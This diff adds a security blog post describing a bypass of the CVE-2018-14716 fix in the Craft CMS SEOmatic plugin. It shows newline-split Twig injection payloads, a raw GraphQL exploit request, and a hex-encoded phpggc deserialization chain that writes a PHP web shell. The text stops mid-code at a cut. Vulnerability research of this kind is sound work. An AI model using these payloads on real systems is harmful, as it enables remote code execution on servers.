@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Multiple vulnerabilities at Craft CMS SEOmatic plugin | Wow such pwn!</title>
+        <meta name="Description" content="Remote code execution, Server Side Request Forgery at Craft CMS SEOmatic plugin"><meta property="og:title" content="Multiple vulnerabilities at Craft CMS SEOmatic plugin" />
+<meta property="og:description" content="Remote code execution, Server Side Request Forgery at Craft CMS SEOmatic plugin" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/multiple-vulnerabilities-craft-cms-seomatic/" />
+<meta property="article:published_time" content="2020-11-06T16:12:40+01:00" />
+<meta property="article:modified_time" content="2020-11-06T16:12:40+01:00" /><meta property="og:site_name" content="Wow such pwn!" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Multiple vulnerabilities at Craft CMS SEOmatic plugin"/>
+<meta name="twitter:description" content="Remote code execution, Server Side Request Forgery at Craft CMS SEOmatic plugin"/>
+<meta name="theme-color" content="#ffffff">
+<meta name="msapplication-TileColor" content="#da532c">
+<link rel="canonical" href="/multiple-vulnerabilities-craft-cms-seomatic/" />
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="prev" href="/data-processing-libraries-part-two/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/css/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Multiple vulnerabilities at Craft CMS SEOmatic plugin",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/multiple-vulnerabilities-craft-cms-seomatic\/"
+        },"image": {
+                "@type": "ImageObject",
+                "url": "\/cover.png",
+                "width":  800 ,
+                "height":  600 
+            },"genre": "posts","keywords": "rce, ssrf, exploit","wordcount":  1088 ,
+        "url": "\/multiple-vulnerabilities-craft-cms-seomatic\/","datePublished": "2020-11-06T16:12:40\x2b01:00","dateModified": "2020-11-06T16:12:40\x2b01:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                "@type": "Organization",
+                "name": "xxxx",
+                "logo": {
+                "@type": "ImageObject",
+                "url": "\/logo.png",
+                "width":  127 ,
+                "height":  40 
+                }
+            },"description": "Remote code execution, Server Side Request Forgery at Craft CMS SEOmatic plugin"
+    }
+    </script></head>
+    <body><script>
+            if (!window.localStorage || !window.localStorage.getItem('theme')) {window.isDark = 'dark' === 'dark';} else {
+                window.isDark = (window.localStorage && window.localStorage.getItem('theme')) === 'dark';
+            }
+            window.isDark && document.body.classList.add('dark-theme');
+        </script><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title animated bounceIn">
+            <a href="/">Wow such pwn!</a>
+        </div>
+        <div class="menu"><a class="menu-item" href="/posts/">Posts</a><a class="menu-item" href="/tags/">Tags</a><a class="menu-item" href="/categories/">Categories</a><a class="menu-item" href="/about/">About</a><a class="menu-item" href="/ru/" title="Русский"><i class="fas fa-language fa-fw"></i></a><a href="javascript:void(0);" class="theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-rotate-180 fa-fw"></i>
+            </a>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-wrapper">
+        <div class="header-container">
+            <div class="header-title animated bounceIn">
+                <a href="/">Wow such pwn!</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/ru/" title="Русский"><i class="fas fa-language fa-fw"></i></a><a href="javascript:void(0);" class="theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-rotate-180 fa-fw"></i>
+            </a>
+        </div>
+    </div>
+</header>
+
+<script>
+    window.desktopHeaderMode = "fixed";
+    window.mobileHeaderMode = "auto";
+</script>
+<main class="main">
+                <div class="container"><article class="page single"><h1 class="single-title animated flipInX">Multiple vulnerabilities at Craft CMS SEOmatic plugin</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author">
+                    <a class="author" href="https://twitter.com/d4d89704243" rel="author" target="_blank">
+                        <i class="fas fa-user-circle fa-fw"></i>d4d
+                    </a>
+                </span>&nbsp;<span class="post-category">included in&nbsp;
+                            <span>
+                                <a href="/categories/remote-code-execution">
+                                    <i class="far fa-folder fa-fw"></i>Remote code execution
+                                </a>
+                            </span>&nbsp;
+                            <span>
+                                <a href="/categories/server-side-request-forgery">
+                                    <i class="far fa-folder fa-fw"></i>Server side request forgery
+                                </a>
+                            </span>&nbsp;
+                            <span>
+                                <a href="/categories/code-review">
+                                    <i class="far fa-folder fa-fw"></i>Code review
+                                </a>
+                            </span></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i><time datetime=2020-11-06>2020-11-06</time>&nbsp;
+                <i class="fas fa-pencil-alt fa-fw"></i>about 1088 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>6 min&nbsp;</div>
+        </div><div class="content"><p>A couple of months ago I was performing retest of an interesting Server Side Request Forgery (SSRF) vulnerability at debug GET parameter. Developers disabled it on load balancer and I decided to perform some fuzzing with awesome Burp Suite plugin <a href="https://github.com/PortSwigger/param-miner" target="_blank" rel="noopener noreffer">param-miner</a>
+. There was no way to exploit SSRF but interesting parameter <code>action</code> was discovered. Future investigation show that it is default behavior of <a href="https://craftcms.com/" target="_blank" rel="noopener noreffer">Craft CMS</a>
+. Fast search by public CVE retured promising vulnerability CVE-2018-14716. You can find information about issue and way to exploit it at blog post <a href="http://ha.cker.info/exploitation-of-server-side-template-injection-with-craft-cms-plguin-seomatic/" target="_blank" rel="noopener noreffer">0xB455</a>
+. When you will finish reading article return and we find way to bypass fix and execute code at vulnerable system.</p>
+<h3 id="initial-setup-of-vulnerable-cms">Initial setup of vulnerable CMS</h3>
+<p>Before we start let&rsquo;s prepare our own library. Craft CMS Seomatic plugin version before 3.3.15 required to reproduce issues. Intallation guide can be found at official <a href="https://craftcms.com/docs/3.x/installation.html" target="_blank" rel="noopener noreffer">documentation</a>
+ plugin can be found at <a href="https://plugins.craftcms.com/seomatic" target="_blank" rel="noopener noreffer">plugin store</a>
+. Vulnerable application had Pro license and to test localy I made small fix at file
+⁨craft⁩/vendor⁩/⁨craftcms⁩/⁨cms⁩/⁨src⁩/⁨controllers/GraphqlController.php:57</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"> // Craft::$app-&gt;requireEdition(Craft::Pro);
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="security-protection-bypass">Security protection bypass</h3>
+<p>Now everything is ready to get started. Fix of CVE-2018-14716 is implemented at function sanitizeUrl(). It takes user supplied parameter url decode it and replace all strings with following rule <code>/{.*}/</code> to delete all Twig template special symbols. Vulnerable code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">
+	public static function sanitizeUrl(string $url, bool $checkStatus = true): string
+    {
+        // Remove the query string
+        $url = UrlHelper::stripQueryString($url);
+        // HTML decode the entities, then strip out any tags
+        $url = html_entity_decode($url, ENT_NOQUOTES, &#39;UTF-8&#39;);
+        $url = urldecode($url);
+        $url = strip_tags($url);
+
+        // If this is a &gt;= 400 status code, set the canonical URL to nothing
+        if ($checkStatus <span class="err">&amp;&amp;</span> Craft::$app-&gt;getResponse()-&gt;statusCode &gt;= 400) {
+            $url = &#39;&#39;;
+        }
+        // Remove any Twig tags that somehow are present in the incoming URL
+        /** @noinspection CallableParameterUseCaseInTypeContextInspection */
+        $result = preg_replace(&#39;/{.*}/&#39;, &#39;&#39;, $url);
+        // var_dump($result);
+        if (!empty($result) <span class="err">&amp;&amp;</span> $result) {
+            $url = $result;
+        } else {
+            $url = &#39;&#39;;
+        }
+
+        return $url;
+    }
+</code></pre></td></tr></table>
+</div>
+</div><p>Hopefully for attacker Regular Expressions (Perl-Compatible) have some funny behavior that will allows to bypass such protection. Let&rsquo;s take a look at <a href="https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener noreffer">docs</a>
+</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">s (PCRE_DOTALL) 
+If this modifier is set, a dot metacharacter in the pattern matches all characters, including newlines. Without it, newlines are excluded.
+</code></pre></td></tr></table>
+</div>
+</div><p>Finally to bypass protection malicious user should split it template injection payload with new line symbols. Proof of Concept can be presented as <code>{{\n13*13\n}}</code>.
+Seomatic plugin API was disabled at target assets - it is another major obstacle to seccusefully inject Twig template. By default it should be available at endpoint <code>/actions/seomatic/meta-container/all-meta-containers?uri=</code> and if you are lucky you can skip next section.
+<figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="images/seomatic-config.png" alt="Seomatic plugin API" title="Seomatic plugin API" class="lazyload">
+<figcaption class="image-caption">Seomatic plugin API</figcaption></figure>
+</p>
+<h3 id="graphql">Graphql</h3>
+<p>There is another way to exploit vulnerability - Graphql Controller. By default graphql query available at <code>/actions/graphql/api</code>. Seomatic plugin register its seomatic query by default. We can get access to Secret information with unauthorization request to graphql api with <code>uri</code> value <code>{{\n1337*13\n}}</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">POST /index.php?p=admin/actions/graphql/api HTTP/1.1
+Host: 127.0.0.1:8000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:8000/admin/seomatic/plugin
+X-Requested-With: XMLHttpRequest
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+
+query=query{seomatic(uri:&#34;{{\n1337*13\n}}&#34;){metaTitleContainer,metaTagContainer}}
+
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="images/seomatic-ssti-1337.png" alt="Seomatic SSTI" title="Seomatic SSTI" class="lazyload">
+<figcaption class="image-caption">Seomatic SSTI</figcaption></figure>
+</p>
+<h3 id="remote-code-execution-by-unserialize">Remote code execution by unserialize</h3>
+<p>The old Remote Code Execution exploit available at internet looks like <code>{{craft.app.view.evaluateDynamicContent('print(system(&quot;ls&quot;))')}}</code> but unfortunately for us it was disabled at version 3.5.0. At first I was trying to get RCE chain by unserialize function at <code>craft.app.getQueue().unserializeMessage()</code>. The only working chain at Craft CMS environment is <em>Guzzle/FW1</em> but it has some limitations that should be addressed first. Serialized object contains <code>{}</code> chars. We should modify string to exclude them from payload. As you may know PHP support <code>\\x00</code> encoding. I modified <strong>phpggc</strong> tool to print out exploit in new encoding. So it looks like:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">./phpggc Guzzle/FW1 /tmp/exploit.txt data -s    
+O:31:<span class="s2">&#34;GuzzleHttp\Cookie\FileCookieJar&#34;</span>:4:<span class="o">{</span>s:41:<span class="s2">&#34;%00GuzzleHttp\Cookie\FileCookieJar%00filename&#34;</span>%3Bs:16:<span class="s2">&#34;/tmp/exploit.txt&#34;</span>%3Bs:52:<span class="s2">&#34;%00GuzzleHttp\Cookie\FileCookieJar%00storeSessionCookies&#34;</span>%3Bb:1%3Bs:36:<span class="s2">&#34;%00GuzzleHttp\Cookie\CookieJar%00cookies&#34;</span>%3Ba:1:<span class="o">{</span>i:0%3BO:27:<span class="s2">&#34;GuzzleHttp\Cookie\SetCookie&#34;</span>:1:<span class="o">{</span>s:33:<span class="s2">&#34;%00GuzzleHttp\Cookie\SetCookie%00data&#34;</span>%3Ba:3:<span class="o">{</span>s:7:<span class="s2">&#34;Expires&#34;</span>%3Bi:1%3Bs:7:<span class="s2">&#34;Discard&#34;</span>%3Bb:0%3Bs:5:<span class="s2">&#34;Value&#34;</span>%3Bs:80:<span class="s2">&#34;&lt;?php if(isset(</span><span class="nv">$_REQUEST</span><span class="s2">[&#39;cmd&#39;])){ </span><span class="nv">$cmd</span><span class="s2"> = (</span><span class="nv">$_REQUEST</span><span class="s2">[&#39;cmd&#39;])%3B system(</span><span class="nv">$cmd</span><span class="s2">)%3B }?&gt;%0A&#34;</span>%3B<span class="o">}}}</span>s:39:<span class="s2">&#34;%00GuzzleHttp\Cookie\CookieJar%00strictMode&#34;</span>%3BN%3B<span class="o">}</span>
+
+<span class="se">\\</span>x4f<span class="se">\\</span>x3a<span class="se">\\</span>x33<span class="se">\\</span>x31<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x47<span class="se">\\</span>x75<span class="se">\\</span>x7a<span class="se">\\</span>x7a<span class="se">\\</span>x6c<span class="se">\\</span>x65<span class="se">\\</span>x48<span class="se">\\</span>x74<span class="se">\\</span>x74<span class="se">\\</span>x70<span class="se">\\</span>x5c<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x5c<span class="se">\\</span>x46<span class="se">\\</span>x69<span class="se">\\</span>x6c<span class="se">\\</span>x65<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x4a<span class="se">\\</span>x61<span class="se">\\</span>x72<span class="se">\\</span>x22<span class="se">\\</span>x3a<span class="se">\\</span>x34<span class="se">\\</span>x3a<span class="se">\\</span>x7b<span class="se">\\</span>x73<span class="se">\\</span>x3a<span class="se">\\</span>x34<span class="se">\\</span>x31<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x00<span class="se">\\</span>x47<span class="se">\\</span>x75<span class="se">\\</span>x7a<span class="se">\\</span>x7a<span class="se">\\</span>x6c<span class="se">\\</span>x65<span class="se">\\</span>x48<span class="se">\\</span>x74<span class="se">\\</span>x74<span class="se">\\</span>x70<span class="se">\\</span>x5c<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x5c<span class="se">\\</span>x46<span class="se">\\</span>x69<span class="se">\\</span>x6c<span class="se">\\</span>x65<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x4a<span class="se">\\</span>x61<span class="se">\\</span>x72<span class="se">\\</span>x00<span class="se">\\</span>x66<span class="se">\\</span>x69<span class="se">\\</span>x6c<span class="se">\\</span>x65<span class="se">\\</span>x6e<span class="se">\\</span>x61<span class="se">\\</span>x6d<span class="se">\\</span>x65<span class="se">\\</span>x22<span class="se">\\</span>x3b<span class="se">\\</span>x73<span class="se">\\</span>x3a<span class="se">\\</span>x31<span class="se">\\</span>x36<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x2f<span class="se">\\</span>x74<span class="se">\\</span>x6d<span class="se">\\</span>x70<span class="se">\\</span>x2f<span class="se">\\</span>x65<span class="se">\\</span>x78<span class="se">\\</span>x70<span class="se">\\</span>x6c<span class="se">\\</span>x6f<span class="se">\\</span>x69<span class="se">\\</span>x74<span class="se">\\</span>x2e<span class="se">\\</span>x74<span class="se">\\</span>x78<span class="se">\\</span>x74<span class="se">\\</span>x22<span class="se">\\</span>x3b<span class="se">\\</span>x73<span class="se">\\</span>x3a<span class="se">\\</span>x35<span class="se">\\</span>x32<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x00<span class="se">\\</span>x47<span class="se">\\</span>x75<span class="se">\\</span>x7a<span class="se">\\</span>x7a<span class="se">\\</span>x6c<span class="se">\\</span>x65<span class="se">\\</span>x48<span class="se">\\</span>x74<span class="se">\\</span>x74<span class="se">\\</span>x70<span class="se">\\</span>x5c<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x5c<span class="se">\\</span>x46<span class="se">\\</span>x69<span class="se">\\</span>x6c<span class="se">\\</span>x65<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x4a<span class="se">\\</span>x61<span class="se">\\</span>x72<span class="se">\\</span>x00<span class="se">\\</span>x73<span class="se">\\</span>x74<span class="se">\\</span>x6f<span class="se">\\</span>x72<span class="se">\\</span>x65<span class="se">\\</span>x53<span class="se">\\</span>x65<span class="se">\\</span>x73<span class="se">\\</span>x73<span class="se">\\</span>x69<span class="se">\\</span>x6f<span class="se">\\</span>x6e<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x73<span class="se">\\</span>x22<span class="se">\\</span>x3b<span class="se">\\</span>x62<span class="se">\\</span>x3a<span class="se">\\</span>x31<span class="se">\\</span>x3b<span class="se">\\</span>x73<span class="se">\\</span>x3a<span class="se">\\</span>x33<span class="se">\\</span>x36<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x00<span class="se">\\</span>x47<span class="se">\\</span>x75<span class="se">\\</span>x7a<span class="se">\\</span>x7a<span class="se">\\</span>x6c<span class="se">\\</span>x65<span class="se">\\</span>x48<span class="se">\\</span>x74<span class="se">\\</span>x74<span class="se">\\</span>x70<span class="se">\\</span>x5c<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x5c<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x4a<span class="se">\\</span>x61<span class="se">\\</span>x72<span class="se">\\</span>x00<span class="se">\\</span>x63<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x73<span class="se">\\</span>x22<span class="se">\\</span>x3b<span class="se">\\</span>x61<span class="se">\\</span>x3a<span class="se">\\</span>x31<span class="se">\\</span>x3a<span class="se">\\</span>x7b<span class="se">\\</span>x69<span class="se">\\</span>x3a<span class="se">\\</span>x30<span class="se">\\</span>x3b<span class="se">\\</span>x4f<span class="se">\\</span>x3a<span class="se">\\</span>x32<span class="se">\\</span>x37<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x47<span class="se">\\</span>x75<span class="se">\\</span>x7a<span class="se">\\</span>x7a<span class="se">\\</span>x6c<span class="se">\\</span>x65<span class="se">\\</span>x48<span class="se">\\</span>x74<span class="se">\\</span>x74<span class="se">\\</span>x70<span class="se">\\</span>x5c<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x5c<span class="se">\\</span>x53<span class="se">\\</span>x65<span class="se">\\</span>x74<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x22<span class="se">\\</span>x3a<span class="se">\\</span>x31<span class="se">\\</span>x3a<span class="se">\\</span>x7b<span class="se">\\</span>x73<span class="se">\\</span>x3a<span class="se">\\</span>x33<span class="se">\\</span>x33<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x00<span class="se">\\</span>x47<span class="se">\\</span>x75<span class="se">\\</span>x7a<span class="se">\\</span>x7a<span class="se">\\</span>x6c<span class="se">\\</span>x65<span class="se">\\</span>x48<span class="se">\\</span>x74<span class="se">\\</span>x74<span class="se">\\</span>x70<span class="se">\\</span>x5c<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x5c<span class="se">\\</span>x53<span class="se">\\</span>x65<span class="se">\\</span>x74<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x00<span class="se">\\</span>x64<span class="se">\\</span>x61<span class="se">\\</span>x74<span class="se">\\</span>x61<span class="se">\\</span>x22<span class="se">\\</span>x3b<span class="se">\\</span>x61<span class="se">\\</span>x3a<span class="se">\\</span>x33<span class="se">\\</span>x3a<span class="se">\\</span>x7b<span class="se">\\</span>x73<span class="se">\\</span>x3a<span class="se">\\</span>x37<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x45<span class="se">\\</span>x78<span class="se">\\</span>x70<span class="se">\\</span>x69<span class="se">\\</span>x72<span class="se">\\</span>x65<span class="se">\\</span>x73<span class="se">\\</span>x22<span class="se">\\</span>x3b<span class="se">\\</span>x69<span class="se">\\</span>x3a<span class="se">\\</span>x31<span class="se">\\</span>x3b<span class="se">\\</span>x73<span class="se">\\</span>x3a<span class="se">\\</span>x37<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x44<span class="se">\\</span>x69<span class="se">\\</span>x73<span class="se">\\</span>x63<span class="se">\\</span>x61<span class="se">\\</span>x72<span class="se">\\</span>x64<span class="se">\\</span>x22<span class="se">\\</span>x3b<span class="se">\\</span>x62<span class="se">\\</span>x3a<span class="se">\\</span>x30<span class="se">\\</span>x3b<span class="se">\\</span>x73<span class="se">\\</span>x3a<span class="se">\\</span>x35<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x56<span class="se">\\</span>x61<span class="se">\\</span>x6c<span class="se">\\</span>x75<span class="se">\\</span>x65<span class="se">\\</span>x22<span class="se">\\</span>x3b<span class="se">\\</span>x73<span class="se">\\</span>x3a<span class="se">\\</span>x38<span class="se">\\</span>x30<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x3c<span class="se">\\</span>x3f<span class="se">\\</span>x70<span class="se">\\</span>x68<span class="se">\\</span>x70<span class="se">\\</span>x20<span class="se">\\</span>x69<span class="se">\\</span>x66<span class="se">\\</span>x28<span class="se">\\</span>x69<span class="se">\\</span>x73<span class="se">\\</span>x73<span class="se">\\</span>x65<span class="se">\\</span>x74<span class="se">\\</span>x28<span class="se">\\</span>x24<span class="se">\\</span>x5f<span class="se">\\</span>x52<span class="se">\\</span>x45<span class="se">\\</span>x51<span class="se">\\</span>x55<span class="se">\\</span>x45<span class="se">\\</span>x53<span class="se">\\</span>x54<span class="se">\\</span>x5b<span class="se">\\</span>x27<span class="se">\\</span>x63<span class="se">\\</span>x6d<span class="se">\\</span>x64<span class="se">\\</span>x27<span class="se">\\</span>x5d<span class="se">\\</span>x29<span class="se">\\</span>x29<span class="se">\\</span>x7b<span class="se">\\</span>x20<span class="se">\\</span>x24<span class="se">\\</span>x63<span class="se">\\</span>x6d<span class="se">\\</span>x64<span class="se">\\</span>x20<span class="se">\\</span>x3d<span class="se">\\</span>x20<span class="se">\\</span>x28<span class="se">\\</span>x24<span class="se">\\</span>x5f<span class="se">\\</span>x52<span class="se">\\</span>x45<span class="se">\\</span>x51<span class="se">\\</span>x55<span class="se">\\</span>x45<span class="se">\\</span>x53<span class="se">\\</span>x54<span class="se">\\</span>x5b<span class="se">\\</span>x27<span class="se">\\</span>x63<span class="se">\\</span>x6d<span class="se">\\</span>x64<span class="se">\\</span>x27<span class="se">\\</span>x5d<span class="se">\\</span>x29<span class="se">\\</span>x3b<span class="se">\\</span>x20<span class="se">\\</span>x73<span class="se">\\</span>x79<span class="se">\\</span>x73<span class="se">\\</span>x74<span class="se">\\</span>x65<span class="se">\\</span>x6d<span class="se">\\</span>x28<span class="se">\\</span>x24<span class="se">\\</span>x63<span class="se">\\</span>x6d<span class="se">\\</span>x64<span class="se">\\</span>x29<span class="se">\\</span>x3b<span class="se">\\</span>x20<span class="se">\\</span>x7d<span class="se">\\</span>x3f<span class="se">\\</span>x3e<span class="se">\\</span>x0a<span class="se">\\</span>x22<span class="se">\\</span>x3b<span class="se">\\</span>x7d<span class="se">\\</span>x7d<span class="se">\\</span>x7d<span class="se">\\</span>x73<span class="se">\\</span>x3a<span class="se">\\</span>x33<span class="se">\\</span>x39<span class="se">\\</span>x3a<span class="se">\\</span>x22<span class="se">\\</span>x00<span class="se">\\</span>x47<span class="se">\\</span>x75<span class="se">\\</span>x7a<span class="se">\\</span>x7a<span class="se">\\</span>x6c<span class="se">\\</span>x65<span class="se">\\</span>x48<span class="se">\\</span>x74<span class="se">\\</span>x74<span class="se">\\</span>x70<span class="se">\\</span>x5c<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x5c<span class="se">\\</span>x43<span class="se">\\</span>x6f<span class="se">\\</span>x6f<span class="se">\\</span>x6b<span class="se">\\</span>x69<span class="se">\\</span>x65<span class="se">\\</span>x4a<span class="se">\\</span>x61<span class="se">\\</span>x72<span class="se">\\</span>x00<span class="se">\\</span>x73<span class="se">\\</span>x74<span class="se">\\</span>x72<span class="se">\\</span>x69<span class="se">\\</span>x63<span class="se">\\</span>x74<span class="se">\\</span>x4d<span class="se">\\</span>x6f<span class="se">\\</span>x64<span class="se">\\</span>x65<span class="se">\\</span>x22<span class="se">\\</span>x3b<span class="se">\\</span>x4e<span class="se">\\</span>x3b<span class="se">\\</span>x7d
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="images/seomatic-ssti-unserialize.png" alt="Seomatic SSTI" title="Seomatic SSTI" class="lazyload">
+<figcaption class="image-caption">Seomatic SSTI</figcaption></figure>
+</p>
+<p>Seccusesfully exploitation of vulnerability will creates <code>exploit.txt </code> at <code>/tmp/</code> folder.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">doge in ~/phpggc on master ● ● λ cat /tmp/exploit.txt 
